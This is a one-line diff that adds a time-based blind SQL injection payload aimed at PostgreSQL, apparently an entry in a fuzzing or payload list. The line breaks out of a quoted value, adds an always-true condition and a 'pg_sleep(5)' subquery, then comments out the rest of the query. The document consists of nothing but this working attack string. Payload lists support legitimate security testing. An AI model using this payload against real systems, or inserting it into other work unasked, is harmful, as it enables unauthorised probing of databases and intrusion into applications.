@@ -1,0 +1,1 @@
+1") where 6843=6843 or 6793=(select 6793 from pg_sleep(5))--
